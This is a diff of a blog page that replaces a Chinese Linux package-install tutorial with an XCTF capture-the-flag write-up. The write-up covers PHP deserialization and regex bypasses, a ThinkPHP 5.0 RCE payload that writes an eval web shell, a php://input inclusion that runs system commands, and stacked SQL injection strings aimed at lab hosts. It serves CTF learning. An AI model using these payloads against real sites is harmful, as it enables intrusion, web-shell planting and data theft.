@@ -7,7 +7,7 @@
 
     
 
-    <title>2、安装Apache源码包与介绍RPM包 | 2h0nG&#39;s Blog</title>
+    <title>XCTF训练write up | 2h0nG&#39;s Blog</title>
     <meta name="author" content="John Doe">
     
     <meta name="description" content="Love is friendship fell into love">
@@ -15,7 +15,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <meta property="og:title" content="2、安装Apache源码包与介绍RPM包"/>
+    <meta property="og:title" content="XCTF训练write up"/>
     <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
 
     
@@ -256,7 +256,7 @@
             
     
     
-    <a class="breadcrumb" href="/categories/Linux系统安全/">Linux系统安全</a>
+    <a class="breadcrumb" href="/categories/CTF笔记/">CTF笔记</a>
 
 
         
@@ -273,12 +273,12 @@
             <div class="article-title">
                 
     
-        <h1>2、安装Apache源码包与介绍RPM包</h1>
+        <h1>XCTF训练write up</h1>
     
 
 
             </div>
-            <time class="pink-link-context" datetime="2020-07-18T02:13:00.000Z"><a href="/2020/07/18/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/2%E3%80%81%E5%AE%89%E8%A3%85Apache%E6%BA%90%E7%A0%81%E5%8C%85%E3%80%81%E4%BB%8B%E7%BB%8DRPM%E5%8C%85%E3%80%81yum%E6%BA%90/">2020-07-18</a></time>
+            <time class="pink-link-context" datetime="2020-09-06T09:25:16.000Z"><a href="/2020/09/06/CTF%E7%AC%94%E8%AE%B0/XCTF%E8%AE%AD%E7%BB%83write%20up/">2020-09-06</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -288,58 +288,74 @@
             
     <div class="tags-row">
         
-            <a href="/tags/Linux系统安全/" class="chip pink lighten-1">Linux系统安全</a>
+            <a href="/tags/CTF笔记/" class="chip pink lighten-1">CTF笔记</a>
         
     </div>
 
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E5%AE%89%E8%A3%85Apache%E6%BA%90%E7%A0%81%E5%8C%85%E4%B8%8E%E4%BB%8B%E7%BB%8DRPM%E5%8C%85"><span class="section table-of-contents-text">安装Apache源码包与介绍RPM包</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81Centos6%E5%AE%89%E8%A3%85Apache%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="section table-of-contents-text">一、Centos6安装Apache的步骤</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81%E7%AB%AF%E5%8F%A3%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="section table-of-contents-text">二、端口相关命令</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81%E4%B8%8D%E5%90%8CLinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84%E5%AE%89%E8%A3%85%E5%8C%85"><span class="section table-of-contents-text">三、不同Linux操作系统下的安装包</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81%E6%BA%90%E7%A0%81%E5%8C%85%E4%B8%8ERPM%E5%8C%85%E7%9A%84%E4%B8%8D%E5%90%8C"><span class="section table-of-contents-text">四、源码包与RPM包的不同</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%94%E3%80%81Yum%E6%BA%90%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6"><span class="section table-of-contents-text">五、Yum源安装软件</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%80%E4%B8%AAyum%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8yum%E8%87%AA%E5%8A%A8%E7%9A%84%E5%AE%89%E8%A3%85%E5%85%89%E7%9B%98%E4%B8%AD%E7%9A%84RPM%E5%8C%85%E5%B9%B6%E5%A4%84%E7%90%86%E7%9B%B8%E5%85%B3%E4%BE%9D%E8%B5%96"><span class="section table-of-contents-text">1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖</span></a></li></ol></li></ol></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XCTF%E8%AE%AD%E7%BB%83write-up"><span class="section table-of-contents-text">XCTF训练write up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94Web-php-unserialize"><span class="section table-of-contents-text">1、进阶—Web_php_unserialize</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94php-rce%EF%BC%88thinkphp5-0-RCE%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="section table-of-contents-text">2、进阶—php_rce（thinkphp5.0 RCE漏洞）</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94Web-php-include"><span class="section table-of-contents-text">3、进阶—Web_php_include</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#4%E3%80%81supersqli"><span class="section table-of-contents-text">4、supersqli</span></a></li></ol></li></ol>
 </div>
 
 
             <div class="entry pink-link-context">
-                <h2 id="安装Apache源码包与介绍RPM包"><a href="#安装Apache源码包与介绍RPM包" class="headerlink" title="安装Apache源码包与介绍RPM包"></a>安装Apache源码包与介绍RPM包</h2><h3 id="一、Centos6安装Apache的步骤"><a href="#一、Centos6安装Apache的步骤" class="headerlink" title="一、Centos6安装Apache的步骤"></a>一、Centos6安装Apache的步骤</h3><p>1、将源码压缩包移动到/usr/src 或者 /usr/share下</p>
-<p>2、查看INSTALL文档，编译安装三步骤：./configuration –prefix=安装目录（可缺省，缺省就是/usr/local/apache2）；make；make install</p>
-<p>3、去源码路径的bin下apachectl start即可开启Apache的http服务（关闭就是stop）</p>
-<p><strong>源码包Apache的主页</strong>：在安装路径中的htdocs文件夹中。</p>
-<p><strong>修改Apache的端口号：</strong>1)源码包：$PREFIX/conf/http.conf 2)封装包：/etc/httpd/conf/http.conf; 然后重启</p>
-<h3 id="二、端口相关命令"><a href="#二、端口相关命令" class="headerlink" title="二、端口相关命令"></a>二、端口相关命令</h3><p><code>ss -an</code>：比 netstat 好用的socket统计信息，iproute2 包附带的另一个工具，允许你查询 socket 的有关统计信息</p>
-<p>干掉占用端口的进程:<code>netstat -tnlp | grep 80 ; kill PID</code></p>
-<h3 id="三、不同Linux操作系统下的安装包"><a href="#三、不同Linux操作系统下的安装包" class="headerlink" title="三、不同Linux操作系统下的安装包"></a>三、不同Linux操作系统下的安装包</h3><p><strong>Debian</strong>: deb；<strong>Red Ha</strong>t: rpm,</p>
-<p><strong>RPM包的命名格式</strong>：<code>名字 版本号 编辑次数 系统版本(EL6 == RED HAT6) 系统架构（noarch == 所有cpu架构可用）</code></p>
-<p><strong>查看所有已安装的rpm包</strong>：<code>rpm -qa (query all)</code> </p>
-<p><strong>查看rpm包安装的软件文件列表</strong>:<code>rpm -ql rpm包</code></p>
-<p><strong>查看rpm包的详细信息</strong>：<code>rpm -qpi  rpm包(query package information)</code></p>
-<p><strong>查看rpm的文件列表与安装路径</strong>：<code>rpm-qpl rpm包(list)</code></p>
-<p><strong>安装rpm包</strong>：<code>rpm -ivh rpm包（install verify hash安装时列出标记）</code></p>
-<p><strong>卸载rpm包安装的</strong>：<code>rpm -e 软件名</code>（软件之间会有依赖关系，需要按照依赖逐个rpm -e）</p>
-<p><strong>yum软件安装的各种文件都在哪？</strong>：分布在各个地方，不在一个目录，比如配置文件在/etc,执行文件在/usr/bin,/usr/sbin/, 库文件在/usr/lib, 等等</p>
-<h3 id="四、源码包与RPM包的不同"><a href="#四、源码包与RPM包的不同" class="headerlink" title="四、源码包与RPM包的不同"></a>四、源码包与RPM包的不同</h3><p><strong>源码包</strong>：由厂商开源发布，安装时可定制安装路径，整个软件所有产生的文件都集中在一个文件夹里，方便删除和移动。</p>
-<p><strong>RPM包</strong>：由厂商封装好，操作系统提供RPM包管理支持，安装路径固定，且分散（比如配置文件在/etc，可执行文件在/bin），不可以详细的定制安装路径，但是方便管理，只需要使用rpm命令工具即可进行管理操作，无需手动管理。</p>
-<h3 id="五、Yum源安装软件"><a href="#五、Yum源安装软件" class="headerlink" title="五、Yum源安装软件"></a>五、Yum源安装软件</h3><p>Yum源工具本身就是为了使安装与卸载等操作简单化，原理上是根据配置文件中的依赖关系列表来自动化处理依赖关系。</p>
-<h4 id="1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖"><a href="#1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖" class="headerlink" title="1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖"></a>1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖</h4><p><strong>yum配置文件路径</strong>：/etc/yum.repo.d</p>
-<p>1）首先将yum.repo.d下的所有配置文件备份到一个bak文件夹中</p>
-<p>2）新建一个文件dvd.repo，并且编辑它</p>
-<p>3）内容如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dvdrom] #标签</span><br><span class="line">name=&quot;yum dvd rom&quot; #描述</span><br><span class="line">baseurl=file:///media/CentOS_6.9_Final #依赖关系列表位置</span><br><span class="line">gpgcheck=0 #是否进行密钥对检查，如需检查，下一行需要写公钥文件位置gpgkey=file:///XXXX（由于公钥是权威的Centos的公钥，而私钥无人知道，因此很保密、权威）</span><br></pre></td></tr></table></figure>
+                <h2 id="XCTF训练write-up"><a href="#XCTF训练write-up" class="headerlink" title="XCTF训练write up"></a>XCTF训练write up</h2><h3 id="1、进阶—Web-php-unserialize"><a href="#1、进阶—Web-php-unserialize" class="headerlink" title="1、进阶—Web_php_unserialize"></a>1、进阶—Web_php_unserialize</h3><p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; <span class="comment">//反序列化后会调用此函数，反序列化的对象属性个数错误时，会绕过此函数。CVE-2016-7124</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>依赖关系列表就存储在光盘中的repodata中，以xml的形式存在。 这些xml应该不仅描述了软件的依赖，还描述了软件的安装地址。（否则如何在不联网的情况下自动安装了DVD1中的rpm）</p>
-<p><strong>yum安装软件</strong>：<code>yum install 软件名</code></p>
-<p><strong>yum卸载软件</strong>：<code>yum remove 软件名</code></p>
+<p><strong>Write Up：</strong>此题主要考察两个点。1、php反序列化漏洞；2、preg_match的函数绕过。</p>
+<p>1、通过php反序列化漏洞首先得到我们希望执行的Payload：</p>
+<p><code>?var = O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>，这里重点时对象的属性数量错误，绕过wakeup。</p>
+<p>2、绕过preg_match正则表达式的匹配。</p>
+<p>源码：<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>，匹配的是 -&gt; O/C : 任意数字：这种字符串，且大小写都可。这里我傻了，其实只要4前加一个+即可，Payload:</p>
+<p><code>?var = O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
+<p><strong>Flag：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/dxG2ZT"><img src="https://s1.ax1x.com/2020/09/01/dxG2ZT.png" alt="dxG2ZT.png"></a></p>
+<h3 id="2、进阶—php-rce（thinkphp5-0-RCE漏洞）"><a href="#2、进阶—php-rce（thinkphp5-0-RCE漏洞）" class="headerlink" title="2、进阶—php_rce（thinkphp5.0 RCE漏洞）"></a>2、进阶—php_rce（thinkphp5.0 RCE漏洞）</h3><blockquote>
+<p>漏洞影响范围：5.1 &lt;= 5.1.32 / 5.0 &lt;= 5.0.23</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e4%b8%8e%e5%88%a9%e7%94%a8%e6%80%bb%e7%bb%93/">https://0kee.360.cn/blog/thinkphp-5-x-rce-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e4%b8%8e%e5%88%a9%e7%94%a8%e6%80%bb%e7%bb%93/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12622077.html">https://www.cnblogs.com/zpchcbd/p/12622077.html</a></p>
+<p>Payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=zxc1.php&amp;vars[1][]=&lt;?php @eval($_POST[zjc]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、进阶—Web-php-include"><a href="#3、进阶—Web-php-include" class="headerlink" title="3、进阶—Web_php_include"></a>3、进阶—Web_php_include</h3><p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">$page=$_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Payload：这里采用php伪协议的input方法。大小写转变绕过防御，php://input 是个可以访问POST请求数据的只读流。所以Payload由BP抓包修改发送。最终由include函数将POST中的代码包含到文件中执行，发现flag在fl4gisisish3r3.php中，再次修改post内容查看该文件即可拿到flag。</p>
+<blockquote>
+<p>这里没有用到hello，看writeup其实有更多的解题方法，日后慢慢学习。这里第一次接触了php支持的相关伪协议。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=Php:<span class="comment">//input HTTP/1.1</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4、supersqli"><a href="#4、supersqli" class="headerlink" title="4、supersqli"></a>4、supersqli</h3><p>经过测试此题只有层叠注入可用，通过层叠注入，我们可以获得表的信息，发现flag在名为1919810931114514的数据表下，下面是三种注入获得flag方式。</p>
+<p><strong>方法一：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sallyzhang/p/12627343.html">https://www.cnblogs.com/sallyzhang/p/12627343.html</a></p>
+<p>该题只过滤了select|update|delete|drop|insert|where命令，却没有过滤alter，因此，我们可以将1919810931114514表改名为业务逻辑表words，并且修改对应的字段和原words表相同，即可正常逻辑访问得出flag。</p>
+<blockquote>
+<p>words表列是id(int10)和data(varchar10)，每次查询业务都会查询这两列数据且where id</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、将业务逻辑words表改为其他名字，将flag表改为words，对应flag字段改为业务中查询的id</span><br><span class="line">http://220.249.52.133:47012/?inject=1&#x27;;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">RENAME</span> <span class="keyword">TO</span> words1;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">RENAME</span> <span class="keyword">TO</span> words;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">CHANGE</span> flag <span class="keyword">id</span> <span class="built_in">VARCHAR</span>(<span class="number">50</span>);<span class="comment">#</span></span><br><span class="line">2、万能查询所有即可</span><br><span class="line">http://220.249.52.133:47012/?inject=1&#x27; or 1=1;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.mysqlzh.com/doc/131.html">https://www.mysqlzh.com/doc/131.html</a></p>
+<p>SQL预处理语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:44445/?inject=1&#x27;;<span class="keyword">set</span> @flag=<span class="keyword">concat</span>(<span class="string">&#x27; se&#x27;</span>,<span class="string">&#x27;lect flag from `1919810931114514`&#x27;</span>); <span class="keyword">Prepare</span> res <span class="keyword">from</span> @flag;<span class="keyword">execute</span> res;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方法三：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/joker-vip/p/12483823.html">https://www.cnblogs.com/joker-vip/p/12483823.html</a></p>
+<p>使用handler查询，payload如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>HANDLER…OPEN语句用于打开一个表，通过后续的HANDLER…READ语句建立读取表的通道。本表目标不会被其它线程共享，也不会关闭，直到线程调用</p>
+</blockquote>
 
                 
-<p class="pink-link-context">
-    <a href="/2020/07/19/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/3%E3%80%81Linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3/" rel="next" title="3、Linux用户管理与权限相关">
-    上一篇：3、Linux用户管理与权限相关
-  </a>
-</p>
-
 
 
 <p class="pink-link-context">
-    <a href="/2020/07/17/Leetcode/31%E3%80%81%E4%B8%8B%E4%B8%80%E4%B8%AA%E6%8E%92%E5%88%97/" rel="next" title="31-下一个排列">
-    下一篇：31-下一个排列
+    <a href="/2020/09/02/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/18%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="next" title="文件包含漏洞">
+    下一篇：文件包含漏洞
   </a>
 </p>
 
